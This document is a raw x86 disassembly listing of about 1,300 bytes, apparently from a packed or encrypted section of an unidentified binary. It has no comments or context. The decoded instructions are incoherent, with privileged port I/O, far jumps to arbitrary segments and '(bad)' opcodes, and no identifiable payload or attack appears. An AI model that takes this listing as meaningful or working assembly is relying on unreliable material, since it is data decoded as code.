  418cf1:	lea    ecx,[ecx-0x782e308e]
  418cf7:	mul    ecx
  418cf9:	push   edx
  418cfa:	inc    ebx
  418cfb:	dec    eax
  418cfc:	and    al,0x16
  418cfe:	in     eax,dx
  418cff:	popa   
  418d00:	pop    eax
  418d01:	or     eax,0x9735754
  418d06:	inc    ebp
  418d07:	cmp    ah,BYTE PTR [esi]
  418d09:	adc    DWORD PTR [edi+0xcfa6fda],edx
  418d0f:	sbb    eax,0x8d3e2ef0
  418d14:	lds    ecx,FWORD PTR [ebp-0x4b]
  418d17:	test   eax,0x45d2d2d
  418d1c:	sub    BYTE PTR [ecx+eiz*8+0x23],ch
  418d20:	and    BYTE PTR [edx+0x52],bh
  418d23:	lds    eax,FWORD PTR [esi+0x75]
  418d26:	mov    ebx,0xffd3707
  418d2b:	fld    DWORD PTR [edi+0x7e148fda]
  418d31:	aam    0xdd
  418d33:	out    0xa9,al
  418d35:	or     ebx,DWORD PTR [ecx-0x4]
  418d38:	dec    edi
  418d39:	mov    bh,ch
  418d3b:	jmp    0x7d8d6d6b
  418d40:	or     al,0xc6
  418d42:	pusha  
  418d43:	push   es
  418d44:	retf   0x7f6b
  418d47:	and    ebp,0xffffff85
  418d4a:	inc    edi
  418d4b:	outs   dx,DWORD PTR ds:[esi]
  418d4c:	scas   eax,DWORD PTR es:[edi]
  418d4d:	jp     0x418cd0
  418d4f:	scas   al,BYTE PTR es:[edi]
  418d50:	arpl   WORD PTR [ebx+edx*2],sp
  418d53:	mov    ebx,0x15acac78
  418d58:	xor    ah,dh
  418d5a:	cmp    BYTE PTR [ebp+ecx*4-0x42097eca],bh
  418d61:	jge    0x418d20
  418d63:	test   eax,0x4d4cb765
  418d68:	inc    edi
  418d69:	scas   al,BYTE PTR es:[edi]
  418d6a:	into   
  418d6b:	jbe    0x418d2f
  418d6d:	imul   ebp,ecx,0xffffff96
  418d70:	dec    ebp
  418d71:	mov    ebp,0x2ad298a8
  418d76:	push   edi
  418d77:	adc    DWORD PTR [edx],0x27
  418d7a:	test   DWORD PTR [edi+eiz*8],edx
  418d7d:	push   edx
  418d7e:	les    esi,FWORD PTR [edi+esi*2]
  418d81:	scas   al,BYTE PTR es:[edi]
  418d82:	cmp    bl,al
  418d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d85:	ret    0x578f
  418d88:	jecxz  0x418d4f
  418d8a:	adc    eax,0x737948cd
  418d8f:	sbb    BYTE PTR [esi+0x6a],cl
  418d92:	js     0x418def
  418d94:	push   eax
  418d95:	out    0x4d,al
  418d97:	pop    es
  418d98:	lds    edi,FWORD PTR [esi]
  418d9a:	mov    BYTE PTR [ebx+0x6bca4da1],cl
  418da0:	xchg   ebp,eax
  418da1:	sbb    DWORD PTR [edi+0x72],ecx
  418da4:	fsub   st,st(3)
  418da6:	popf   
  418da7:	sbb    esi,DWORD PTR [eax+0xa]
  418daa:	mov    edx,0xd96cd2c8
  418daf:	test   DWORD PTR [eax],ebp
  418db1:	mov    al,ds:0x5e641d62
  418db6:	jo     0x418d5e
  418db8:	or     BYTE PTR [edx+0x3b8e7f8d],ch
  418dbe:	rcl    cl,cl
  418dc0:	and    eax,esi
  418dc2:	pop    esi
  418dc3:	lahf   
  418dc4:	pop    esp
  418dc5:	push   edi
  418dc6:	call   0xf8f1:0xb443cc8d
  418dcd:	das    
  418dce:	push   ss
  418dcf:	cmp    dl,BYTE PTR [ecx+0x5b067ef7]
  418dd5:	xchg   BYTE PTR [ebp-0x4ce78d9f],bh
  418ddb:	int3   
  418ddc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ddd:	sub    eax,0xe0d6345e
  418de2:	push   eax
  418de3:	cld    
  418de4:	mov    esp,0x99c8d14f
  418de9:	outs   dx,DWORD PTR ds:[esi]
  418dea:	imul   esi,esp,0x855f4e23
  418df0:	jmp    0x65e49209
  418df5:	or     BYTE PTR [edi-0x3a],al
  418df8:	jge    0x418da3
  418dfa:	cld    
  418dfb:	dec    esp
  418dfc:	sub    BYTE PTR ds:0x47edcc1e,dl
  418e02:	in     al,dx
  418e03:	test   eax,0x507127aa
  418e08:	mov    ebp,0x1da76ee6
  418e0d:	gs dec edx
  418e0f:	aad    0xa5
  418e11:	dec    edi
  418e12:	jae    0x418dc2
  418e14:	cwde   
  418e15:	mov    dl,0x7c
  418e17:	js     0x418e76
  418e19:	mov    DWORD PTR [ecx-0x53],ebx
  418e1c:	pushf  
  418e1d:	sbb    eax,0x991b7268
  418e22:	rcl    DWORD PTR [esi-0x31a4a81],0xcb
  418e29:	lock repnz lods al,BYTE PTR ds:[esi]
  418e2c:	mov    eax,ds:0x8929b813
  418e31:	mov    bl,0x2f
  418e33:	add    al,0x8b
  418e35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e36:	pop    esi
  418e37:	push   edi
  418e38:	add    eax,0x41be7f
  418e3d:	pop    eax
  418e3e:	stos   BYTE PTR es:[edi],al
  418e3f:	pop    eax
  418e40:	adc    dl,BYTE PTR [edi+0x29af243c]
  418e46:	xchg   ebp,eax
  418e47:	dec    ebx
  418e48:	mov    dh,0x9a
  418e4a:	es or  bl,dl
  418e4d:	jge    0x418e5f
  418e4f:	mov    al,ds:0xbaee607e
  418e54:	mov    eax,ds:0xcfd68c5b
  418e59:	xchg   ebp,eax
  418e5a:	push   eax
  418e5b:	fcomp  QWORD PTR [edx+edi*2+0x6544d769]
  418e62:	mov    dh,ah
  418e64:	jmp    0xc252:0xe619840f
  418e6b:	cmc    
  418e6c:	neg    BYTE PTR [eax+ecx*8]
  418e6f:	fnstenv [ebp+0x5a7284ad]
  418e75:	ins    BYTE PTR es:[edi],dx
  418e76:	fldenv [esp+ebp*8]
  418e79:	dec    DWORD PTR [ecx]
  418e7b:	mov    dl,0xac
  418e7d:	popf   
  418e7e:	fisttp DWORD PTR [edx]
  418e80:	hlt    
  418e81:	aas    
  418e82:	rcl    BYTE PTR [edx+0x15],cl
  418e85:	jb     0x418ef4
  418e87:	dec    ebp
  418e88:	mov    edi,0x87c6cc6
  418e8d:	inc    ecx
  418e8e:	push   ebx
  418e8f:	pop    edi
  418e90:	aas    
  418e91:	lods   eax,DWORD PTR ds:[esi]
  418e92:	scas   eax,DWORD PTR es:[edi]
  418e93:	and    edi,DWORD PTR [edx+0x41d1f599]
  418e99:	sub    bh,BYTE PTR [ecx+0x1d]
  418e9c:	pusha  
  418e9d:	mov    ecx,0xe2fe1c6e
  418ea2:	jecxz  0x418e56
  418ea4:	xor    DWORD PTR [esi],0xffffffb3
  418ea7:	mov    eax,?
  418ea9:	lahf   
  418eaa:	enter  0xd6a9,0x3c
  418eae:	adc    al,0x29
  418eb0:	jp     0x418e71
  418eb2:	retf   
  418eb3:	push   edi
  418eb4:	imul   ebp,esp,0xffffffb9
  418eb7:	or     eax,0x4fd4861f
  418ebc:	mov    edx,DWORD PTR [ecx]
  418ebe:	xlat   BYTE PTR ds:[ebx]
  418ebf:	push   0x62ef6ef8
  418ec4:	aaa    
  418ec5:	cmp    dh,BYTE PTR [ecx+0x6ad9a6ae]
  418ecb:	pop    eax
  418ecc:	mov    ds:0x424221f8,eax
  418ed1:	cmp    BYTE PTR ds:[edx-0x9],0x27
  418ed6:	shl    DWORD PTR ds:0x301fffd4,cl
  418edc:	inc    edi
  418edd:	or     al,BYTE PTR [esi-0x6f]
  418ee0:	in     eax,0xd7
  418ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee3:	test   DWORD PTR [esi+0x397b6818],esp
  418ee9:	adc    al,0x32
  418eeb:	stos   DWORD PTR es:[edi],eax
  418eec:	pop    esp
  418eed:	push   ebp
  418eee:	out    0x5b,al
  418ef0:	cld    
  418ef1:	or     DWORD PTR [ebp+0x6c],eax
  418ef4:	or     bh,cl
  418ef6:	fstp   TBYTE PTR [esi]
  418ef8:	ficom  WORD PTR [edi+0x7f]
  418efb:	mov    ah,0x3f
  418efd:	xchg   esp,eax
  418efe:	inc    esp
  418eff:	rol    cl,1
  418f01:	outs   dx,BYTE PTR ds:[esi]
  418f02:	dec    esi
  418f03:	clc    
  418f04:	jge    0x418ef2
  418f06:	push   es
  418f07:	xor    al,0x8f
  418f09:	jbe    0x418f46
  418f0b:	cmp    eax,0x19b33c94
  418f10:	push   es
  418f11:	or     esp,edx
  418f13:	mov    esp,0x17345ed
  418f18:	mov    ebx,0xab08c7ac
  418f1d:	popf   
  418f1e:	mov    ebx,0x8cda2e6b
  418f23:	inc    edi
  418f24:	jmp    0xd019b4fb
  418f29:	mov    eax,0x3f19d924
  418f2e:	add    DWORD PTR [ebx+0x49],0xae12c508
  418f35:	sbb    al,BYTE PTR [esi]
  418f37:	daa    
  418f38:	(bad)  
  418f3a:	fidivr WORD PTR [ecx]
  418f3c:	fist   DWORD PTR [eax]
  418f3e:	les    edx,FWORD PTR [eax+0x50499cb5]
  418f44:	jbe    0x418f80
  418f46:	push   DWORD PTR [edi-0x6ad20452]
  418f4c:	pop    ds
  418f4d:	lahf   
  418f4e:	call   0x5223:0x442efd1f
  418f55:	push   edi
  418f56:	mov    edx,?
  418f58:	and    eax,0x98b48b24
  418f5d:	xor    DWORD PTR [ecx+0x77],ebp
  418f60:	or     al,0x99
  418f62:	xchg   ecx,eax
  418f63:	mov    ch,0xae
  418f65:	jnp    0x418f61
  418f67:	and    DWORD PTR [esi-0x311612d0],esp
  418f6d:	jg     0x418f32
  418f6f:	dec    edx
  418f70:	xlat   BYTE PTR ds:[ebx]
  418f71:	adc    DWORD PTR [esi-0x33ff84f4],esp
  418f77:	je     0x418fde
  418f79:	int3   
  418f7a:	jmp    0x5609bc15
  418f7f:	jmp    0x418f71
  418f81:	pop    ds
  418f82:	inc    edi
  418f83:	lock sub eax,0x472558b1
  418f89:	push   ss
  418f8a:	call   0x6c99:0xa8ff672a
  418f91:	or     dh,BYTE PTR [edx+0x45]
  418f94:	in     al,0x1e
  418f96:	iret   
  418f97:	ins    BYTE PTR es:[edi],dx
  418f98:	inc    eax
  418f99:	cmp    eax,0x7ffec8bf
  418f9e:	push   ecx
  418f9f:	xchg   DWORD PTR [ebx+0x6d],ebx
  418fa2:	test   eax,0x781ff807
  418fa7:	pop    ds
  418fa8:	cmp    ebp,ebp
  418faa:	out    0x36,al
  418fac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fad:	in     eax,0xbd
  418faf:	sti    
  418fb0:	jnp    0x418f6c
  418fb2:	jne    0x418f54
  418fb4:	in     eax,0xbd
  418fb6:	sti    
  418fb7:	mov    esi,edi
  418fb9:	cmp    esp,DWORD PTR cs:0x5b63e4d3
  418fc0:	adc    ecx,eax
  418fc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fc3:	inc    eax
  418fc4:	mov    ds:0x93185528,eax
  418fc9:	mov    ebp,0x34a4ba52
  418fce:	imul   esp,DWORD PTR [esi],0x39e517b4
  418fd4:	bound  edi,QWORD PTR [esi]
  418fd6:	test   BYTE PTR [ebx+ebx*1+0x24],0xce
  418fdb:	mov    edx,0x2984a180
  418fe0:	xor    al,0x72
  418fe2:	pop    edx
  418fe3:	mov    ds:0xcbb16b7b,al
  418fe8:	xchg   edi,eax
  418fe9:	jmp    0x58ac:0x47725fba
  418ff0:	js     0x41906f
  418ff2:	fcomp  DWORD PTR [ebx+0x41695578]
  418ff8:	imul   eax,DWORD PTR [ebx+0x349d088f],0xffffffc2
  418fff:	push   edx
  419000:	cmp    al,0xa5
  419002:	or     al,0x5e
  419004:	repz imul esp,ebp,0x6c
  419008:	inc    ebp
  419009:	xor    ah,bl
  41900b:	mov    edx,0x287869d4
  419010:	jle    0x15c677e5
  419016:	pop    ds
  419017:	(bad)  
  419018:	push   cs
  419019:	popa   
  41901a:	into   
  41901b:	jnp    0x418fb6
  41901d:	mov    ah,0x75
  41901f:	mov    al,ds:0xcc2f8170
  419024:	push   eax
  419025:	inc    edx
  419026:	aaa    
  419027:	xor    eax,0x31ecc741
  41902c:	shl    BYTE PTR [ebx],1
  41902e:	jg     0x41904b
  419030:	sbb    ebx,esi
  419032:	dec    esi
  419033:	push   ebp
  419034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419035:	inc    ecx
  419036:	jae    0x419020
  419038:	sbb    DWORD PTR ds:0x15e8cdef,edx
  41903e:	push   es
  41903f:	add    eax,0x50739c67
  419044:	dec    esi
  419045:	xchg   edx,eax
  419046:	add    bh,BYTE PTR [edi]
  419048:	push   esp
  419049:	shl    ah,1
  41904b:	xchg   edi,eax
  41904c:	jmp    0x4a6e1242
  419051:	sub    ebx,0x50
  419054:	jmp    0x8826:0x89c2ebd1
  41905b:	jne    0x419040
  41905d:	call   0x2788:0x1269dd9
  419064:	je     0x418ff6
  419066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419067:	adc    edx,edi
  419069:	sbb    eax,0x3ca888ec
  41906e:	adc    al,0x27
  419070:	push   0xfffffffc
  419072:	push   DWORD PTR [bp+di]
  419075:	call   0x84ce:0xe0290a54
  41907c:	test   DWORD PTR [ebp-0x1c3ec457],ebp
  419082:	mov    esp,0x4af91b9
  419087:	aad    0x32
  419089:	jp     0x4190b4
  41908b:	icebp  
  41908c:	mov    esi,0x710d1d0a
  419091:	fs pushf 
  419093:	gs sti 
  419095:	push   cs
  419096:	vmwrite esp,ebp
  419099:	sbb    BYTE PTR [ebp+0x37],bl
  41909c:	in     eax,0xd3
  41909e:	(bad)  
  41909f:	dec    edi
  4190a0:	jnp    0x4190e6
  4190a2:	mov    BYTE PTR [edx],0xef
  4190a5:	stos   DWORD PTR es:[edi],eax
  4190a6:	std    
  4190a7:	rcl    BYTE PTR [edi+eiz*1-0x5],cl
  4190ab:	jne    0x419075
  4190ad:	cwde   
  4190ae:	popa   
  4190af:	enter  0xa41e,0x29
  4190b3:	retf   
  4190b4:	test   al,0x60
  4190b6:	lahf   
  4190b7:	add    BYTE PTR [edx-0x41],dh
  4190ba:	jle    0x41911b
  4190bc:	add    eax,0x3a05f6ea
  4190c1:	lods   eax,DWORD PTR ds:[esi]
  4190c2:	mov    ebp,0x8c26f503
  4190c7:	cmp    dh,bh
  4190c9:	pop    ebp
  4190ca:	les    ecx,FWORD PTR [esi+0x2d]
  4190cd:	cld    
  4190ce:	xchg   ebp,eax
  4190cf:	add    bh,cl
  4190d1:	xor    BYTE PTR [ecx-0x586484e3],bl
  4190d7:	sti    
  4190d8:	dec    ebx
  4190d9:	ret    0xe423
  4190dc:	xlat   BYTE PTR ds:[ebx]
  4190dd:	mov    al,0xc1
  4190df:	enter  0x9eb,0x17
  4190e3:	sti    
  4190e4:	sbb    eax,0x2070301c
  4190e9:	cld    
  4190ea:	inc    eax
  4190eb:	shl    DWORD PTR [edi+esi*4],cl
  4190ee:	int    0x16
  4190f0:	pop    ebp
  4190f1:	popf   
  4190f2:	inc    ebp
  4190f3:	pop    esp
  4190f4:	into   
  4190f5:	fadd   st(2),st
  4190f7:	pop    eax
  4190f8:	or     eax,0xc0824c8d
  4190fd:	sub    ch,BYTE PTR [edx]
  4190ff:	lods   al,BYTE PTR ds:[esi]
  419100:	xchg   esp,eax
  419101:	cwde   
  419102:	(bad)  
  419103:	fcomp  QWORD PTR [edi-0x13]
  419106:	mov    WORD PTR [eax+0xc],gs
  419109:	retf   0x379d
  41910c:	mov    cl,al
  41910e:	pop    ds
  41910f:	jmp    0xef5f934b
  419114:	mov    esp,0xde3cd9a9
  419119:	js     0x41910a
  41911b:	not    BYTE PTR [eax+0x158ce310]
  419121:	pop    ebp
  419122:	addr16 xchg edi,eax
  419124:	push   ebp
  419125:	adc    eax,0xe7cbbc8c
  41912a:	int3   
  41912b:	mov    ebx,0x25934545
  419130:	jge    0x419199
  419132:	vprotd xmm11,xmm1,0x5e
  419137:	or     esi,DWORD PTR [eax+0x471cc4f5]
  41913d:	mov    BYTE PTR [eax+0x6d77c1d2],ah
  419143:	mov    edi,0xbd1986f
  419148:	xchg   esp,eax
  419149:	mov    dh,0xda
  41914b:	adc    BYTE PTR [ecx+0x43],cl
  41914e:	xchg   edi,eax
  41914f:	sbb    DWORD PTR [edi],0xffffff99
  419152:	sub    BYTE PTR [edi+0x1a54698c],al
  419158:	push   es
  419159:	popf   
  41915a:	push   ss
  41915b:	jbe    0x41919d
  41915d:	sub    eax,0x4cb5ed46
  419162:	jae    0x419186
  419164:	(bad)  
  419165:	xor    cl,BYTE PTR [edx]
  419167:	fcomi  st,st(4)
  419169:	loope  0x4191d1
  41916b:	jmp    0x419186
  41916d:	xor    eax,0xbba8fa60
  419172:	pop    ebx
  419173:	pop    ecx
  419174:	je     0x4191f2
  419176:	or     cl,ch
  419178:	adc    edx,DWORD PTR [edi]
  41917a:	retf   
  41917b:	cld    
  41917c:	pop    esi
  41917d:	sar    ebx,1
  41917f:	ret    
  419180:	in     eax,0x2e
  419182:	xchg   edi,eax
  419183:	cmp    ebp,DWORD PTR [ecx]
  419185:	scas   al,BYTE PTR es:[edi]
  419186:	dec    esi
  419187:	std    
  419188:	cmp    bh,BYTE PTR [esi]
  41918a:	push   eax
  41918b:	pusha  
  41918c:	xchg   DWORD PTR [ebp+0x3c0693c2],edi
  419192:	pop    eax
  419193:	nop
  419194:	retf   0x41bf
  419197:	cmp    BYTE PTR [esi],dh
  419199:	rcr    DWORD PTR [esi+0x4d],cl
  41919c:	ror    DWORD PTR [edi-0x19],cl
  41919f:	jne    0x419194
  4191a1:	mov    ebp,0x9c6ba310
  4191a6:	fdiv   st(5),st
  4191a8:	sbb    al,0x9f
  4191aa:	mov    ecx,0xba029e32
  4191af:	test   BYTE PTR ds:0xfa109d9b,ah
  4191b5:	fisttp WORD PTR [edx-0x2f31ca02]
  4191bb:	dec    esi
  4191bc:	inc    esi
  4191bd:	sub    eax,DWORD PTR [ebp-0x28]
  4191c0:	push   cs
  4191c1:	cmp    BYTE PTR [edx],0xb7
  4191c4:	lock cli 
  4191c6:	bound  ecx,QWORD PTR [edx-0x43]
  4191c9:	push   ecx
  4191ca:	pop    ds
  4191cb:	push   cs
  4191cc:	xor    ah,BYTE PTR [ecx-0x32]
  4191cf:	push   esp
  4191d0:	sub    ebx,eax
  4191d2:	(bad)  
  4191d4:	daa    
  4191d5:	cmp    al,0xbe
  4191d7:	push   ds
  4191d8:	jp     0x419168
  4191da:	mov    edi,0xb99313d5
  4191df:	aaa    
  4191e0:	gs je  0x419182
  4191e3:	jo     0x419249
  4191e5:	pop    eax
  4191e6:	adc    ah,cl
  4191e8:	inc    ecx
  4191e9:	js     0x4191d3
  4191eb:	lea    edi,[ecx]
  4191ed:	jl     0x419220
  4191ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191f0:	jbe    0x419257
  4191f2:	xchg   ebp,eax
  4191f3:	or     BYTE PTR [edi+0x3ccffadb],ch
  4191f9:	js     0x41926d
  4191fb:	frstor [edx]
  4191fd:	cmp    BYTE PTR [edi+0x6ad24822],dh
  419203:	outs   dx,DWORD PTR ds:[esi]
  419204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419205:	cmp    BYTE PTR [edx+edi*1+0x36a6195f],al
  41920c:	push   eax
  41920d:	push   ss
  41920e:	jnp    0x41924d
  419210:	mov    al,0xe6
  419212:	mov    esi,0x5c5323f5
  419217:	dec    edx
  419218:	xchg   ebp,eax
  419219:	pop    esp
  41921a:	mov    edi,0x2c7378c
  41921f:	mov    ebp,0x881b664
  419224:	ror    dl,cl
  419226:	gs mov ecx,0xef1bcc8b
  41922c:	jg     0x41925f
  41922e:	push   esp
  41922f:	dec    eax
  419230:	sbb    dl,BYTE PTR [ecx+0x24]
  419233:	inc    ebp
  419234:	adc    DWORD PTR [edi+0x2],edi
  419237:	and    ah,BYTE PTR [ecx-0x10]
  41923a:	cs in  al,0xf
  41923d:	jne    0x419270
  41923f:	sub    al,0xaf
  419241:	pop    edi
  419242:	push   0xf932e4e5
  419247:	mov    bl,0x5f
  419249:	rcr    DWORD PTR ds:0xdb026902,cl
  41924f:	adc    al,0x8f
  419251:	test   BYTE PTR [ecx+edi*2+0x1f],ch
  419255:	ss mov ecx,0x9c1590ae
  41925b:	imul   esp,DWORD PTR [edi-0x8370b8a],0x3e873151
  419265:	outs   dx,BYTE PTR ds:[esi]
  419266:	lds    eax,FWORD PTR [edx+0x4827d930]
  41926c:	fwait
  41926d:	mov    edi,0xa731f2f8
  419272:	lds    esi,FWORD PTR [eax-0x5b4fe9a6]
  419278:	cli    
  419279:	retf   
  41927a:	and    eax,0xab7085c5
  41927f:	push   esi
  419280:	or     BYTE PTR [ebp-0x267ff4bd],bh
  419286:	push   edx
  419287:	and    bh,BYTE PTR [ebp-0x6a]
  41928a:	ret    
  41928b:	lea    ecx,[edx]
  41928d:	hlt    
  41928e:	and    edi,DWORD PTR [eax-0x6f9a663a]
  419294:	inc    edx
  419295:	fiadd  WORD PTR [ebx]
  419297:	mov    DWORD PTR [ebx+0x72],edi
  41929a:	shl    BYTE PTR [esi+ecx*2+0xb],0x1a
  41929f:	fmulp  st(2),st
  4192a1:	xor    eax,0x9e216003
  4192a6:	push   eax
  4192a7:	lods   al,BYTE PTR ds:[esi]
  4192a8:	push   ds
  4192a9:	lahf   
  4192aa:	out    0x32,al
  4192ac:	div    BYTE PTR [ecx+0x1521f789]
  4192b2:	test   eax,0xad902da2
  4192b7:	lds    esp,FWORD PTR [ecx+0x4879193f]
  4192bd:	add    eax,0xbe328b28
  4192c2:	pop    ebx
  4192c3:	sub    ebp,DWORD PTR [ecx+0x579fbfb0]
  4192c9:	adc    bl,BYTE PTR [esi+edx*4+0x4eae0b52]
  4192d0:	jno    0x4192ed
  4192d2:	mov    al,ss:0x233274dc
  4192d8:	xor    ch,bl
  4192da:	sub    eax,0xc06fc245
  4192df:	sub    al,0x8f
  4192e1:	mov    edi,0xbfc93087
  4192e6:	adc    al,0xd7
  4192e8:	int    0x5b
  4192ea:	mov    dl,0x80
  4192ec:	call   0xcf75db29
  4192f1:	clc    
  4192f2:	cmp    al,0x5b
  4192f4:	mov    al,ds:0x98061ec6
  4192f9:	jae    0x41931e
  4192fb:	jp     0x4192a0
  4192fd:	or     BYTE PTR [ebx+0x35],ah
  419300:	pop    ebx
  419301:	daa    
  419302:	push   cs
  419303:	push   es
  419304:	clc    
  419305:	cld    
  419306:	shl    eax,cl
  419308:	lea    ecx,[ebp+0x29]
  41930b:	sar    BYTE PTR [eax],1
  41930d:	inc    edx
  41930e:	mov    cl,0xfb
  419310:	mov    dl,0xbd
  419312:	pop    ds
  419313:	mov    dl,0xc3
  419315:	pop    ebx
  419316:	inc    ecx
  419317:	imul   edi,DWORD PTR [ebx+edi*1+0x7],0x10
  41931c:	dec    esp
  41931d:	or     BYTE PTR [ebx],bl
  41931f:	adc    BYTE PTR [ecx+eax*2],bl
  419322:	call   0x643e6813
  419327:	shl    esp,0x16
  41932a:	dec    esp
  41932b:	hlt    
  41932c:	ds dec ebp
  41932e:	ret    
  41932f:	pop    esi
  419330:	aam    0xd3
  419332:	ins    DWORD PTR es:[edi],dx
  419333:	outs   dx,DWORD PTR ds:[esi]
  419334:	outs   dx,BYTE PTR ds:[esi]
  419335:	ror    edx,cl
  419337:	dec    ecx
  419338:	in     al,0xf5
  41933a:	mov    eax,0x2dffa178
  41933f:	mov    dl,0x97
  419341:	mov    ebx,DWORD PTR [ebx+0x36]
  419344:	imul   edx,DWORD PTR ds:0xc4e35678,0x19b3eb8c
  41934e:	and    DWORD PTR [edi-0x55a3ab3b],edi
  419354:	push   ebp
  419355:	xchg   ax,sp
  419358:	stc    
  419359:	push   eax
  41935a:	std    
  41935b:	scas   eax,DWORD PTR es:[edi]
  41935c:	aam    0x40
  41935e:	dec    BYTE PTR [ebp+0x26]
  419361:	or     DWORD PTR [esp+edi*8-0x50],esp
  419365:	xor    BYTE PTR [ecx],dh
  419367:	(bad)  
  419368:	rcr    BYTE PTR [ebp-0x3a],1
  41936b:	out    0x14,eax
  41936d:	dec    edi
  41936e:	shl    BYTE PTR [ebp+0x2325882a],0xad
  419375:	or     ecx,DWORD PTR [edx+0x45d77c5d]
  41937b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41937c:	outs   dx,DWORD PTR ds:[esi]
  41937d:	lods   eax,DWORD PTR ds:[esi]
  41937e:	ins    BYTE PTR es:[edi],dx
  41937f:	shr    BYTE PTR [ecx-0x64],1
  419382:	push   ebp
  419383:	adc    esp,ebx
  419385:	test   eax,0x5c9be58
  41938a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41938b:	ror    BYTE PTR [ecx+0x13],1
  41938e:	jge    0x419331
  419390:	in     al,dx
  419391:	cmp    BYTE PTR [ebp-0x330eb454],0xf6
  419398:	xor    DWORD PTR ds:0xcb71ad19,0x9d77281a
  4193a2:	cld    
  4193a3:	icebp  
  4193a4:	es add cl,dl
  4193a7:	push   esi
  4193a8:	daa    
  4193a9:	push   ebp
  4193aa:	test   DWORD PTR [edi],esp
  4193ac:	mov    eax,ds:0x30111bcf
  4193b1:	lock xchg esi,eax
  4193b3:	mov    bl,BYTE PTR ds:0x779fc359
  4193b9:	mov    cs,WORD PTR [esi+esi*1]
  4193bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193bd:	and    ecx,eax
  4193bf:	fisttp QWORD PTR [eax]
  4193c1:	add    eax,0x4183e706
  4193c6:	hlt    
  4193c7:	ins    DWORD PTR es:[edi],dx
  4193c8:	shr    BYTE PTR [edx+0x52],1
  4193cb:	imul   edi
  4193cd:	aad    0x9b
  4193cf:	in     al,dx
  4193d0:	out    0xc5,eax
  4193d2:	sar    BYTE PTR [eax-0x479253a0],1
  4193d8:	fs jbe 0x419434
  4193db:	adc    DWORD PTR [ebx+0x60],edx
  4193de:	jmp    0x4193a4
  4193e0:	mov    ah,0xee
  4193e2:	mov    bh,al
  4193e4:	mov    ?,WORD PTR [esi]
  4193e6:	push   esi
  4193e7:	(bad)  
  4193e9:	test   DWORD PTR [esi],ecx
  4193eb:	out    0x5a,eax
  4193ed:	adc    esp,eax
  4193ef:	enter  0xf6b5,0x47
  4193f3:	inc    edi
  4193f4:	les    esi,FWORD PTR [ebx+eax*8]
  4193f7:	cmp    al,0x3f
  4193f9:	xor    dh,BYTE PTR [edi]
  4193fb:	sub    DWORD PTR [ecx-0xb],edx
  4193fe:	sbb    DWORD PTR [ecx+ecx*2+0x59],ebx
  419402:	int3   
  419403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419404:	adc    al,0x14
  419406:	sbb    al,BYTE PTR [edi]
  419408:	ss push ebx
  41940a:	mov    ?,WORD PTR [eax]
  41940c:	clc    
  41940d:	fcmovne st,st(0)
  41940f:	push   esp
  419410:	pushf  
  419411:	add    al,0x5a
  419413:	faddp  st(2),st
  419415:	xchg   edx,eax
  419416:	test   DWORD PTR [edi+ebp*2+0x78d24411],esi
  41941d:	cwde   
  41941e:	and    edi,ebx
  419420:	pop    eax
  419421:	jno    0x4193fe
  419423:	sub    eax,0xf81e7df0
  419428:	dec    esp
  419429:	ins    DWORD PTR es:[edi],dx
  41942a:	loopne 0x4193bd
  41942c:	sub    DWORD PTR [ebx+0x13],ebx
  41942f:	imul   ebp,DWORD PTR [ecx+eax*8-0x5d],0xffffff92
  419434:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419435:	inc    edi
  419436:	inc    edx
  419437:	iret   
  419438:	das    
  419439:	ins    BYTE PTR es:[edi],dx
  41943a:	xchg   edi,eax
  41943b:	mov    eax,0xec2518e5
  419440:	dec    ebx
  419441:	(bad)  
  419442:	pop    edi
  419443:	add    DWORD PTR [ebp+0x56e86e2f],ecx
  419449:	sub    eax,0x9c838fce
  41944e:	scas   al,BYTE PTR es:[edi]
  41944f:	mov    bh,0x6d
  419451:	mov    esp,0xf24cc1e0
  419456:	pop    eax
  419457:	mov    ecx,0xea677f50
  41945c:	mov    ch,0xb2
  41945e:	gs packuswb mm4,mm6
  419462:	jo     0x41947b
  419464:	out    0x21,al
  419466:	pop    edx
  419467:	push   edx
  419468:	outs   dx,DWORD PTR ds:[esi]
  419469:	and    bl,BYTE PTR [esp+eiz*4+0x4c9bfe8f]
  419470:	rcr    al,1
  419472:	icebp  
  419473:	daa    
  419474:	sbb    DWORD PTR [ebx+eax*8-0x1e2f5db6],ecx
  41947b:	mov    ?,WORD PTR [esi+0x61]
  41947e:	dec    edi
  41947f:	mov    esp,0xed6f11f1
  419484:	daa    
  419485:	inc    ecx
  419486:	pushf  
  419487:	shl    bh,1
  419489:	popa   
  41948a:	xchg   ebx,eax
  41948b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41948c:	pop    eax
  41948d:	out    dx,al
  41948e:	push   0xffffffc5
  419490:	pop    edx
  419491:	jnp    0x419458
  419493:	mov    ecx,0x7102d07e
  419498:	stos   DWORD PTR es:[edi],eax
  419499:	adc    esp,DWORD PTR [esi+edx*2+0x5f2d1cc6]
  4194a0:	mul    DWORD PTR [eax-0x5a9866cd]
  4194a6:	dec    ebp
  4194a7:	mov    ch,dl
  4194a9:	fcom   QWORD PTR [esi]
  4194ab:	fwait
  4194ac:	stos   BYTE PTR es:[edi],al
  4194ad:	loope  0x419484
  4194af:	js     0x419500
  4194b1:	fxch   st(5)
  4194b3:	and    esi,DWORD PTR [ecx-0x206f4747]
  4194b9:	repz push 0x48
  4194bc:	scas   eax,DWORD PTR es:[edi]
  4194bd:	mov    bh,0xa4
  4194bf:	loope  0x41953d
  4194c1:	xchg   ecx,eax
  4194c2:	std    
  4194c3:	popf   
  4194c4:	mov    edi,0xdb4c5104
